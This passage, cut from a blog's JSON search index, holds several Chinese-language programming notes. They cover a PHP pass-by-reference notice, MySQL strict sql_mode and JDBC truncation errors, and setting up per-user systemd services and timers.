title=\"任意 method\"></a>任意 method</h4>","categories":["Java"],"tags":["spring","java"]},{"title":"Strict Standards: Only variables should be passed by reference","url":"/blog/2019/05/09/Strict-Standards-Only-variables-should-be-passed-by-reference/","content":"<p>最近 php 預設設個錯誤<br>但我程式沒有寫錯…<br>後來找了一下，參照不能代入 function 裡面<br>如這個<code>$price = array_shift(get_product_price($product_key));</code></p>\n<p>因為忘了第二次，所以獨立寫一篇</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$product_price = get_product_price($product_key);</span><br><span class=\"line\">$price = array_shift($product_price);</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://temporarynotesssss.blogspot.com/2015/03/phperror-only-variables-should-be.html\" target=\"_blank\" rel=\"noopener\">臨時筆記: ［PHP］Error: Only variables should be passed by reference</a><br><a href=\"https://malagege.github.io/blog/2019/01/28/PHP%E6%9C%89%E9%97%9C%E5%8F%83%E7%85%A7-Reference-%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/\">PHP 有關參照(Reference)的那些事 | 程式狂想筆記</a>其實我以前就有提到 orz</p>\n","categories":["PHP"],"tags":["php"]},{"title":"Truncated incorrect DOUBLE value: '785+712' 和 Java JDBC預設sql_mode為嚴格模式","url":"/blog/2018/09/10/Truncated-incorrect-DOUBLE-value-785-712-%E5%92%8C-Java-JDBC%E9%A0%90%E8%A8%ADsql-mode%E7%82%BA%E5%9A%B4%E6%A0%BC%E6%A8%A1%E5%BC%8F/","content":"<p>最近遇到一些MySQL地雷，要好好好整理一下<br>正常DB已經設定非嚴格模式<br>今天遇到Java執行遇到Warning不會過<br>SQL執行如insert xxxx …..  select xxx ….<br>語法也沒有錯<br>phpmyadmin可以執行<br>java執行就是過不了<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">2018-09-05 09:45:10,428 ERROR &#123;Thread-0&#125; [xxxxx.rbt.client.lib.Function] : insertMusicBoxReportLog com.mysql.jdbc.MysqlDataTruncation: Data truncation: Truncated incorrect DOUBLE value: &apos;785+712&apos;</span><br></pre></td></tr></table></figure></p>\n<p>這就非常讓我疑惑</p>\n<a id=\"more\"></a>\n<p>首先，先研究這個錯誤問題<br><a href=\"https://com-it.tech/archives/170855\" target=\"_blank\" rel=\"noopener\">https://com-it.tech/archives/170855</a><br>才過一天…，網站就掛掉了 <a href=\"/blog/2018/09/10/Truncated-incorrect-DOUBLE-value-785-712-和-Java-JDBC預設sql-mode為嚴格模式/webbackup.png\" title=\"google cache備份\">google cache備份</a><br>剛剛注意到下面有原網址<a href=\"http://seanlook.com/2016/05/05/mysql-type-conversion/\" target=\"_blank\" rel=\"noopener\">小心MySQL的隐式类型转换陷阱 | Sean’s Notes</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">select &apos;1aa1&apos;==&apos;1&apos;</span><br></pre></td></tr></table></figure>\n<p>就會出現這個問題<br>好像自動轉型會發生狀況<br>產生<strong>Warning</strong></p>\n<p>JDBC不管怎麼樣，預設會自動開啟嚴格模式</p>\n<blockquote>\n<p>spring.datasource.url=jdbc:mysql://localhost:3306/conweb?sessionVariables=sql_mode=’NO_ENGINE_SUBSTITUTION’&amp;jdbcCompliantTruncation=false<br>爬到stackoverflow找到這篇<a href=\"https://stackoverflow.com/questions/13567155/com-mysql-jdbc-mysqldatatruncation-data-truncation-data-too-long-for-column-c\" target=\"_blank\" rel=\"noopener\">java - com.mysql.jdbc.MysqlDataTruncation: Data truncation: Data too long for column ‘column_name’ - Stack Overflow</a></p>\n</blockquote>\n<p>看到可以設定sql_mode就有不好的預感</p>\n<blockquote>\n<p>根据“三、重要的SQL_MODE值”，因而可以获知，使用JDBC Driver作为Mysql Client，碰到”inserting an incorrect value into a column”的情况的时候，会抛出ERROR，而不是WARNING<br>JDBC Driver默认会设置会话SQL_MODE=’STRICT_TRANS_TABLES’的原因是：”enforce JDBC compliance on truncation checks”需要开启”STRICT_TRANS_TABLES”这个SQL_MODE，而在JDBC URL中存在着”jdbcCompliantTruncation”这个参数，该参数可以控制是否开启”enforce JDBC compliance on truncation checks”功能，当我们通过JDBC URL设定”jdbcCompliantTruncation=false”之后，也就不会去默认设置SQL_MODE=’STRICT_TRANS_TABLES’了<br>最後找到這個確認<a href=\"https://blog.csdn.net/dslztx/article/details/47176549\" target=\"_blank\" rel=\"noopener\">Mysql的SQL_MODE - CSDN博客</a></p>\n</blockquote>\n<img src=\"/blog/2018/09/10/Truncated-incorrect-DOUBLE-value-785-712-和-Java-JDBC預設sql-mode為嚴格模式/sql.jpg\" title=\"錯誤訊息\">\n<p>原本不想動測試DB資料，後來還是手動把<code>785+712</code>資料拿掉就正常執行了</p>\n<p><strong>2019-11-25</strong></p>\n<p>建立 table 時後 column 欄位建議要 <code>NULL</code><br>最近踩了一個雷，因為公司內部有兩個DB 做同步，一個用嚴格模式、一個不是<br>導致另一個嚴格模式資料沒有進來</p>\n<p>sql_mode 用 Dbeaver 查詢結果跟 phpmyadmin 不一樣???<br>後來發現跟上次跟 Java 一樣採到一樣的雷<br>有些 client 會自動幫你設定 sql_mode<br>要使用 <code>SHOW GLOBAL VARIABLES LIKE &#39;sql_mode&#39;;</code> 會比較準</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> @@sql_mode;</span><br><span class=\"line\"><span class=\"comment\">-- STRICT_TRANS_TABLES,NO_ENGINE_SUBSTITUTION    for dbeaver</span></span><br><span class=\"line\"><span class=\"comment\">-- NO_ENGINE_SUBSTITUTION  for phpmyadmin</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">SHOW</span> <span class=\"keyword\">GLOBAL</span> <span class=\"keyword\">VARIABLES</span> <span class=\"keyword\">LIKE</span> <span class=\"string\">'sql_mode'</span>;</span><br><span class=\"line\"><span class=\"comment\">-- NO_ENGINE_SUBSTITUTION</span></span><br></pre></td></tr></table></figure>\n<p>非嚴警模式下，Level Warning 層級不會跳錯誤<br>在非嚴警模式下可以 <code>SHOW WARNINGS</code> 看到資料<br><a href=\"https://dev.mysql.com/doc/refman/5.7/en/sql-mode.html#sql-mode-strict\" target=\"_blank\" rel=\"noopener\">MySQL :: MySQL 5.7 Reference Manual :: 5.1.10 Server SQL Modes</a><br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Strict SQL Mode</span><br><span class=\"line\">Strict mode controls how MySQL handles invalid or missing values in data-change statements such as INSERT or UPDATE. A value can be invalid for several reasons. For example, it might have the wrong data type for the column, or it might be out of range. A value is missing when a new row to be inserted does not contain a value for a non-NULL column that has no explicit DEFAULT clause in its definition. (For a NULL column, NULL is inserted if the value is missing.) Strict mode also affects DDL statements such as CREATE TABLE.</span><br></pre></td></tr></table></figure></p>\n<p>裡面都寫得很清楚<br><a href=\"https://dev.mysql.com/doc/refman/5.7/en/create-table.html\" target=\"_blank\" rel=\"noopener\">MySQL :: MySQL 5.7 Reference Manual :: 13.1.18 CREATE TABLE Statement</a><br><a href=\"https://dev.mysql.com/doc/refman/5.7/en/insert.html\" target=\"_blank\" rel=\"noopener\">MySQL :: MySQL 5.7 Reference Manual :: 13.2.5 INSERT Statement</a><br>可以搜尋 strict 關鍵字找<br>改table 欄位大寫也跟 sql_mode有關係</p>\n<p><a href=\"https://stackoverflow.com/questions/7828440/mysql-alter-table-modify-column-failing-at-rows-with-null-values\" target=\"_blank\" rel=\"noopener\">MySQL alter table modify column failing at rows with null values - Stack Overflow</a><br><a href=\"https://nsysumis94.pixnet.net/blog/post/22022962\" target=\"_blank\" rel=\"noopener\">MySQL刪除重複資料 @ Nightmare的胡言亂語 :: 痞客邦 ::</a></p>\n<p>參考來源<br><a href=\"https://www.twle.cn/c/yufei/mysqlfav/mysqlfav-basic-data-type-default.html\" target=\"_blank\" rel=\"noopener\">MySQL 中数据类型的默认值 - default 约束 - MySQL 拾遗 - 简单教程，简单编程</a><br><a href=\"https://segmentfault.com/a/1190000005936172\" target=\"_blank\" rel=\"noopener\">MySQL sql_mode 说明（及处理一起 sql_mode 引发的问题） - Sean’s Notes - SegmentFault 思否</a><br><a href=\"https://www.twle.cn/c/yufei/mysqlfav/mysqlfav-basic-sql_mode.html\" target=\"_blank\" rel=\"noopener\">被 MySQL sql_mode 深深伤害（ 上 ） - MySQL 拾遗 - 简单教程，简单编程</a><br><a href=\"https://www.twle.cn/c/yufei/mysqlfav/mysqlfav-basic-sql_mode2.html\" target=\"_blank\" rel=\"noopener\">被 MySQL sql_mode 深深伤害（ 中 ） - MySQL 拾遗 - 简单教程，简单编程</a><br><a href=\"https://www.twle.cn/c/yufei/mysqlfav/mysqlfav-basic-sql_mode3.html\" target=\"_blank\" rel=\"noopener\">被 MySQL sql_mode 深深伤害（ 下 ） - MySQL 拾遗 - 简单教程，简单编程</a></p>\n<p>彩蛋<br><a href=\"https://github.com/dbeaver/dbeaver/wiki/Data-View-and-Format\" target=\"_blank\" rel=\"noopener\">Data View and Format · dbeaver/dbeaver Wiki · GitHub</a><br><a href=\"https://github.com/dbeaver/dbeaver/wiki/Data-migration\" target=\"_blank\" rel=\"noopener\">Data migration · dbeaver/dbeaver Wiki · GitHub</a></p>\n","categories":["SQL"],"tags":["sql"]},{"title":"Systemd 時間排程筆記","url":"/blog/2020/12/07/Systemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98/","content":"<p>一般我們使用排程都是用 crontab<br>再搭配使用flock 去做程式執行管控，這一段也有可能時間寫死程式一個flag，這無疑是要佔用檔案了<br>前幾天我看到 systemd 可以做排程設定<br>所以就簡單研究一下</p>\n<p>其實之前就有簡單研究<br>一直覺得這個東西非常實用<br>用配置就能完成程式複雜判斷</p>\n<p>網路上還滿多相關教學<br>應該可以用在正式環境上面</p>\n<a id=\"more\"></a>\n<h2 id=\"了解工具名稱\"><a href=\"#了解工具名稱\" class=\"headerlink\" title=\"了解工具名稱\"></a>了解工具名稱</h2><p>Systemd 雖然指令叫 <code>systemctl</code>，但網路上看到都叫 systemd。</p>\n<blockquote>\n<p>查看和控制systemd的主要命令是systemctl。該命令可用查看系統狀態和管理系統及服務。詳見systemctl(1)。 </p>\n</blockquote>\n<p>參考: <a href=\"https://wiki.archlinux.org/index.php/Systemd_(%E6%AD%A3%E9%AB%94%E4%B8%AD%E6%96%87\" target=\"_blank\" rel=\"noopener\">systemd (正體中文) - ArchWiki</a>)</p>\n<h2 id=\"簡單使用\"><a href=\"#簡單使用\" class=\"headerlink\" title=\"簡單使用\"></a>簡單使用</h2><p>之前<a href=\"https://malagege.github.io/blog/2019/10/14/rclone-%E6%8E%9B%E8%BC%89%E7%A1%AC%E7%A2%9F%E5%B0%8F%E8%A8%98/#%E8%87%AA%E5%8B%95%E6%8E%9B%E8%BC%89\">rclone 掛載硬碟小記 | 程式狂想筆記</a>有簡單用過</p>\n<p>後面記得要加<code>sudo systemctl daemon-reload</code><br>後面記得要加<code>sudo systemctl daemon-reload</code><br>後面記得要加<code>sudo systemctl daemon-reload</code></p>\n<p>因為很重要，所以講三遍!!!<br>一不注意就忘記了XD</p>\n<h3 id=\"一般-root-使用小記\"><a href=\"#一般-root-使用小記\" class=\"headerlink\" title=\"一般 root 使用小記\"></a>一般 root 使用小記</h3><p>.target</p>\n<h3 id=\"UNIT-Service-Install\"><a href=\"#UNIT-Service-Install\" class=\"headerlink\" title=\"UNIT,Service,Install\"></a>UNIT,Service,Install</h3><blockquote>\n<p>[Unit] 小節選項</p>\n</blockquote>\n<blockquote>\n<p>單元文件中的 [Unit] 小節 包含與單元類型無關的通用信息。 可用的選項(亦稱”指令”或”屬性”)如下：</p>\n</blockquote>\n<p>參考: <a href=\"http://www.jinbuguo.com/systemd/systemd.unit.html\" target=\"_blank\" rel=\"noopener\">systemd.unit 中文手册 [金步国]</a></p>\n<p>詳細內容:<a href=\"https://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-part-two.html\" target=\"_blank\" rel=\"noopener\">Systemd 入門教程：實戰篇 - 阮一峰的網絡日誌</a> <a href=\"/blog/2020/12/07/Systemd-時間排程筆記/web1.png\" title=\"備份圖\">備份圖</a></p>\n<p>感覺上面重點都提到了…<br><del>我不忍心完整 copy &amp; paste</del>沒大握整理好，可以到裡面看!!<br>這邊整理我覺得之後可能會用到的</p>\n<p>看大多數接學都是用 root 設定 systemd<br><strong>前陣子有看到使用一般 user 操作 systemd</strong><br>本篇重點實作網路案例操作看看</p>\n<h2 id=\"systemctl-–user\"><a href=\"#systemctl-–user\" class=\"headerlink\" title=\"systemctl –user\"></a>systemctl –user</h2><p>最近爬到一篇 一般user也可以使用<br>一般主機排程都是設定在 root(我之前工作大多數都 這樣)<br>但最近在想是不是應該可以切開一個全縣讓工程師去做設定<br>畢竟大多數 MIS 也看不懂程式…</p>\n<h3 id=\"一般使用者實作\"><a href=\"#一般使用者實作\" class=\"headerlink\" title=\"一般使用者實作\"></a>一般使用者實作</h3><p>建置一個 Hello-world.service </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">vim ~/.config/systemd/user/hello-world.service</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight\"><figcaption><span>hello-wrold.service</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">[Unit]</span></span><br><span class=\"line\"><span class=\"attr\">Description</span>=Hello World Service</span><br><span class=\"line\"><span class=\"attr\">After</span>=systend-user-sessions.service</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">[Service]</span></span><br><span class=\"line\"><span class=\"attr\">Type</span>=simple</span><br><span class=\"line\"><span class=\"attr\">ExecStart</span>=/home/malagege/hello-world.sh</span><br><span class=\"line\"><span class=\"attr\">SyslogIdentifier</span>=HelloWorldService</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">[Install]</span></span><br><span class=\"line\"><span class=\"attr\">WantedBy</span>=default.target</span><br><span class=\"line\">`</span><br></pre></td></tr></table></figure>\n<p>啟用 hello-world.service<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">systemctl --user  <span class=\"built_in\">enable</span>  hello-world.service                                                                                   </span><br><span class=\"line\">Created symlink /home/malagege/.config/systemd/user/default.target.wants/hello-world.service → /home/malagege/.config/systemd/user/hello-world.service.</span><br></pre></td></tr></table></figure></p>\n<p><del>竟然不用做 systemctl daemon-reload!!! ~~<br>~~<strong>我還實有看到有的教學有用</strong><code>systemctl --user daemon-reload</code></del><br>修改 timer 的時候需要 <code>systemctl --user daemon-reload</code> 才會生效</p>\n<p>但我這邊沒使用就能用了<br>沒出現先enable 就會有了</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"> systemctl --user  status  hello-world.service</span><br><span class=\"line\">● hello-world.service - Hello World Service</span><br><span class=\"line\">   Loaded: loaded (/home/malagege/.config/systemd/user/hello-world.service; enabled; vendor preset: enabled)</span><br><span class=\"line\">   Active: inactive (dead)</span><br><span class=\"line\">systemctl --user  start  hello-world.service</span><br><span class=\"line\"> ~/.config/systemd/user </span><br><span class=\"line\">systemctl --user  status  hello-world.service</span><br><span class=\"line\">● hello-world.service - Hello World Service</span><br><span class=\"line\">   Loaded: loaded (/home/malagege/.config/systemd/user/hello-world.service; enabled; vendor preset: enabled)</span><br><span class=\"line\">   Active: active (running) since Tue 2020-11-17 23:26:23 CST; 4s ago</span><br><span class=\"line\"> Main PID: 10483 (hello-world.sh)</span><br><span class=\"line\">   CGroup: /user.slice/user-1000.slice/user@1000.service/hello-world.service</span><br><span class=\"line\">           ├─10483 /bin/bash /home/malagege/hello-world.sh</span><br><span class=\"line\">           └─10485 sleep 30</span><br><span class=\"line\"></span><br><span class=\"line\">11月 17 23:26:23 malagege-K42JB systemd[1317]: Started Hello World Service.</span><br></pre></td></tr></table></figure>\n<p>/home/malagege/.config/systemd/user/default.target.wants 裡面會出現  hello-world.service</p>\n<p>systemctl –user  disable  hello-world.service</p>\n<p>成功完成簡單操作</p>\n<h4 id=\"上面案例執行參數小記\"><a href=\"#上面案例執行參數小記\" class=\"headerlink\" title=\"上面案例執行參數小記\"></a>上面案例執行參數小記</h4><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 標準輸出到</span><br><span class=\"line\">StandardOutput=syslog</span><br><span class=\"line\"># 標準錯誤輸出到</span><br><span class=\"line\">StandardError=syslog</span><br><span class=\"line\"># 設置syslog中log的程序名稱</span><br><span class=\"line\">SyslogIdentifier=helloexample</span><br><span class=\"line\"># 設置syslog中log類型</span><br><span class=\"line\">SyslogFacility=local0</span><br><span class=\"line\"># 設置syslog中log級別，此處為info</span><br><span class=\"line\">SyslogLevel=info</span><br></pre></td></tr></table></figure>\n<p>Install 需要設定<br>這邊是網路參考去配置的</p>\n<p>參考:  <a href=\"https://exfast.me/2018/11/linux-use-systemd-manage-application-common-instructions/\" target=\"_blank\" rel=\"noopener\">[Linux] 利用 Systemd 管理應用程式 – 常用指令 | 從入門到放棄</a></p>\n<h2 id=\"timer\"><a href=\"#timer\" class=\"headerlink\" title=\"timer\"></a>timer</h2><p>簡單說一下，這邊操作 systemd 的 timer 只有在 user 登入時候才會跑<br>所以需要做到開機跑 timer，需要設定 Linux 配置<br><strong>我這邊有測試桌面登入，登出會有問題，但不確定是不是每個 Linux 就會這樣，但 Command Line 模式都很正常</strong><br>下面會提到</p>\n<h3 id=\"初始設定\"><a href=\"#初始設定\" class=\"headerlink\" title=\"初始設定\"></a>初始設定</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">loginctl show-user `__user_id__`</span><br></pre></td></tr></table></figure>\n<p>要設定</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">loginctl enable-linger `id -u` # 後面是放使用者名稱 或 id</span><br></pre></td></tr></table></figure>\n<p>會出現 </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">...</span><br><span class=\"line\">...</span><br><span class=\"line\">...</span><br><span class=\"line\">Linger=no</span><br></pre></td></tr></table></figure>\n<p><code>Linger=no</code>代表沒有啟用<br>一般通常不會打開<br>這個不打開的話<br>只要登出使用者帳號，當下 systemd 的 timer 都不會執行<br><del><strong>這邊要注意!!疑似要用 root 權限設定</strong></del><br><del>像我用一般使用者設定</del><br><del>但登出 timer 就沒有繼續跑了…</del><br><del>後來嘗試很就，root 設定 loginctl 就成功了</del><br>結果後來桌面登出有時候 systemctl –user 還是會中斷…</p>\n<blockquote>\n<p>警告： systemd 服務是 沒有 會話的， 它們在 logind 狀態之外運行， 所以不要在 lingering 中啟用自動登陸的功能，這會導致 會話中斷。</p>\n</blockquote>\n<p>參考:<a href=\"https://wiki.archlinux.org/index.php/Systemd_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87\" target=\"_blank\" rel=\"noopener\">systemd (簡體中文)/User (簡體中文) - ArchWiki</a>/User_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)#%E9%9A%8F%E7%B3%BB%E7%BB%9F%E8%87%AA%E5%8A%A8%E5%90%AF%E5%8A%A8systemd%E7%94%A8%E6%88%B7%E5%AE%9E%E4%BE%8B)</p>\n<p>用別的使用者下<code>ps -fu _user_</code>就可以看到有沒有起 <code>systemd --user</code></p>\n<p>有很大機率是這個原因…，不過不知道是我的 ElementaryOS 關係<br>顯示自動開啟不是很正確，有時候桌面登出還是會中斷 systemd<br>有空我再用樹梅派實體機器測試…</p>\n<p><strong>目前猜測用桌面登出會中斷 systemd</strong><br>PS: 我使用的是 ElementaryOS</p>\n<ul>\n<li><a href=\"https://elementaryos.stackexchange.com/questions/7726/how-to-enable-automatic-login-after-installing-elementary-os-loki\" target=\"_blank\" rel=\"noopener\">settings - How to enable automatic login after installing elementary OS Loki - elementary OS Stack Exchange</a></li>\n<li><a href=\"https://unix.stackexchange.com/questions/462845/how-to-apply-lingering-immedeately\" target=\"_blank\" rel=\"noopener\">systemd - How to apply lingering immedeately - Unix &amp; Linux Stack Exchange</a></li>\n<li><a href=\"https://blog.fairycat.cn/post/128\" target=\"_blank\" rel=\"noopener\">用 systemd 管理 laravel 队列和定时任务 - fairycat</a></li>\n</ul>\n<h2 id=\"操作紀錄\"><a href=\"#操作紀錄\" class=\"headerlink\" title=\"操作紀錄\"></a>操作紀錄</h2><p>參考: <a href=\"https://www.junmajinlong.com/linux/systemd/systemd_timer/#systemd-timer%E5%85%A5%E9%97%A8%E7%A4%BA%E4%BE%8B%EF%BC%9A%E6%AF%8F3%E7%A7%92%E8%BF%90%E8%A1%8C%E4%B8%80%E6%AC%A1\" target=\"_blank\" rel=\"noopener\">systemd timer：取代cron和at的定时任务 | 骏马金龙</a></p>\n<figure class=\"highlight ini\"><figcaption><span>hello-timer.service</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">[Unit]</span></span><br><span class=\"line\"><span class=\"attr\">Description</span> = <span class=\"string\">\"Hello Timer Description\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">[Service]</span></span><br><span class=\"line\"><span class=\"attr\">ExecStart</span> = /home/malagege/hello-timer.sh</span><br><span class=\"line\"><span class=\"comment\"># ExecStart = /usr/bin/curl -s -o /dev/null -w '%&#123;http_code&#125;' 'https://www.junmajinlong.com'</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight ini\"><figcaption><span>hello-timer.timer</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">[Unit]</span></span><br><span class=\"line\"><span class=\"attr\">Description</span> = <span class=\"string\">\"run hello timer  every 3 seconds\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">[Timer]</span></span><br><span class=\"line\"><span class=\"attr\">OnActiveSec</span> = <span class=\"number\">1</span>s</span><br><span class=\"line\"><span class=\"attr\">OnUnitInactiveSec</span> = <span class=\"number\">3</span>s</span><br><span class=\"line\"><span class=\"attr\">AccuracySec</span> = <span class=\"number\">1</span>us</span><br><span class=\"line\"><span class=\"attr\">RandomizedDelaySec</span> = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">[Install]</span></span><br><span class=\"line\"><span class=\"attr\">WantedBy</span> = timers.target</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">systemctl --user  start  hello-timer.timer</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">systemctl --user list-timers --all</span><br><span class=\"line\">NEXT                         LEFT    LAST                         PASSED UNIT              ACTIVATES</span><br><span class=\"line\">Wed 2020-11-18 00:05:38 CST  1s left Wed 2020-11-18 00:05:35 CST  1s ago hello-timer.timer hello-timer.service</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">systemctl --user status  hello-timer.timer</span><br><span class=\"line\">● hello-timer.timer - &quot;run hello timer  every 3 seconds&quot;</span><br><span class=\"line\">   Loaded: loaded (/home/malagege/.config/systemd/user/hello-timer.timer; enabled; vendor preset: enabled)</span><br><span class=\"line\">   Active: active (waiting) since Wed 2020-11-18 00:03:25 CST; 9min ago</span><br><span class=\"line\">  Trigger: Wed 2020-11-18 00:13:15 CST; 825ms left</span><br><span class=\"line\"></span><br><span class=\"line\">11月 18 00:03:25 malagege-K42JB systemd[1317]: Started &quot;run hello timer  every 3 seconds&quot;.</span><br><span class=\"line\"> ~/.config/systemd/user </span><br><span class=\"line\">systemctl --user status  hello-timer.service</span><br><span class=\"line\">● hello-timer.service - &quot;Hello Timer Description&quot;</span><br><span class=\"line\">   Loaded: loaded (/home/malagege/.config/systemd/user/hello-timer.service; static; vendor preset: enabled)</span><br><span class=\"line\">   Active: inactive (dead) since Wed 2020-11-18 00:13:18 CST; 2s ago</span><br><span class=\"line\">  Process: 20922 ExecStart=/home/malagege/hello-timer.sh (code=exited, status=0/SUCCESS)</span><br><span class=\"line\"> Main PID: 20922 (code=exited, status=0/SUCCESS)</span><br><span class=\"line\"></span><br><span class=\"line\">11月 18 00:13:18 malagege-K42JB systemd[1317]: Started &quot;Hello Timer Description&quot;.</span><br><span class=\"line\">11月 18 00:13:18 malagege-K42JB hello-timer.sh[20922]: hello world</span><br></pre></td></tr></table></figure>\n<p>很有趣的是 hello-timer.service 裡面狀態是static<br>不太確定是 .timer 影響到他</p>\n<p>查看 log </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">journalctl --user -u hello-timer.service</span><br></pre></td></tr></table></figure>\n<h3 id=\"動態延遲執行\"><a href=\"#動態延遲執行\" class=\"headerlink\" title=\"動態延遲執行\"></a>動態延遲執行</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 定時器啟動後，再過10分鐘第一次觸發定時任務</span><br><span class=\"line\">OnActiveSec=10m</span><br><span class=\"line\"># 每次執行完任務後，再過15分鐘後再次觸發定時任務</span><br><span class=\"line\">OnUnitInactiveSec=15m</span><br><span class=\"line\"># 觸發事件後，允許推遲0-10分鐘再執行被觸發的任務</span><br><span class=\"line\">AccuracySec=10m</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>以上指令的效果是：</p>\n<ul>\n<li>啟動定時器後的10m-20m內的任一時間點觸發第一次定時任務</li>\n<li>之後每隔15m-25m再次觸發定時任務 </li>\n</ul>\n</blockquote>\n<p>作者: 骏马金龙<br>链接: <a href=\"https://www.junmajinlong.com/linux/systemd/systemd_timer/\" target=\"_blank\" rel=\"noopener\">https://www.junmajinlong.com/linux/systemd/systemd_timer/</a><br>来源: 骏马金龙<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>\n<p>分開看指令，可能不是很了解<br>OnUnitInactiveSec 排程執行完之後會執行 service<br>AccuracySec 會增加起排程時間<br>所以才會變成 15~25 分鐘執行</p>\n<blockquote>\n<p>AccuracySec的默認值為1分鐘，所以如果不定義AccuracySec的話，即使用戶期待的是每秒觸發一次定時任務，但事實卻是會在1s-61s時間段內的一個隨機時間點觸發一次定時任務。(可以自己去觀察一下定時任務執行情況)</p>\n<p>但是，觸發定時任務的時間點並不表示這是執行任務的時間點。觸發了定時任務，還需要根據RandomizedDelaySec的值來決定何時執行定時任務。</p>\n<p>RandomizedDelaySec指定觸發定時任務後還需延遲一個指定範圍內的隨機時長才執行任務。該指令默認值為0，表示觸發後立即執行任務。</p>\n<p>使用RandomizedDelaySec，主要是為了在一個時間範圍內分散大量被同時觸發的定時任務，從而避免這些定時任務集中在同一時間點執行而CPU爭搶。</p>\n<p>可見，AccuracySec和RandomizedDelaySec的目的是相反的：</p>\n<pre><code>前者讓指定範圍內的定時器集中在同一個時間點一次性觸發它們的定時任務\n後者讓觸發的、將要被執行的任務均勻分散在一個時間段範圍內\n</code></pre><p>根據以上描述，如果用戶想要讓定時任務非常精確度地執行，需要將它們設置的足夠小。例如：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt; AccuracySec = 1ms        # 定時器到點就觸發定時任務</span><br><span class=\"line\">&gt; RandomizedDelaySec = 0   # 定時任務一觸發就立刻執行任務</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<p>我的感覺選 AccuracySec 應該會比較好</p>\n<h3 id=\"運行級別-別打錯\"><a href=\"#運行級別-別打錯\" class=\"headerlink\" title=\"運行級別(別打錯)\"></a>運行級別(別打錯)</h3><p><a href=\"https://www.junmajinlong.com/linux/systemd/runlevel/\" target=\"_blank\" rel=\"noopener\">systemd時代的運行級別 | 駿馬金龍</a></p>\n<p>總之設定 Install 的 target<br>timers.target 設定成timer.target<br>開機進然不會啟動<br>後來發現少加了s </p>\n<h3 id=\"查看systemd排程時間點\"><a href=\"#查看systemd排程時間點\" class=\"headerlink\" title=\"查看systemd排程時間點\"></a>查看systemd排程時間點</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">systemctl list-timers --no-pager</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>NEXT表示下一次要觸發定時任務的時間點<br>LEFT表示現在距離下次執行任務還剩多長時間(已經確定了下一次執行的時間點)，或者顯示最近一次執行任務已經過去了多長時間(還不確定下一次執行的時間點)&gt; ，稍後解釋了AccuracySec和RandomizedDelaySec就知道為什麼會有這兩種表示方式<br>LAST表示上次觸發定時任務的時間點<br>PASSED表示距離上一次執行任務已經過去多久<br>UNIT表示是哪個定時器<br>ACTIVATES表示該定時器所觸發的任務 </p>\n</blockquote>\n<h3 id=\"查看日誌\"><a href=\"#查看日誌\" class=\"headerlink\" title=\"查看日誌\"></a>查看日誌</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 查看指定服務的所有journal日誌信息</span><br><span class=\"line\"># xxx.service是定時任務的名稱</span><br><span class=\"line\">journalctl -u xxx.service</span><br><span class=\"line\"></span><br><span class=\"line\"># 實時監控尾部日誌，類似tail -f</span><br><span class=\"line\">journalctl -f -u xxx.service</span><br><span class=\"line\"></span><br><span class=\"line\"># 顯示指定時間段內的日誌</span><br><span class=\"line\"># --since：從指定時間點內開始的日誌</span><br><span class=\"line\"># --until：到指定時間點為止的日誌</span><br><span class=\"line\">journalctl -u xxx.service --since=&quot;2020-07-04 19:06:23&quot;</span><br><span class=\"line\">journalctl -u xxx.service --since=&quot;60s ago&quot;</span><br><span class=\"line\">journalctl -u xxx.service --since=&quot;1min ago&quot;</span><br><span class=\"line\">journalctl -u page_test.service 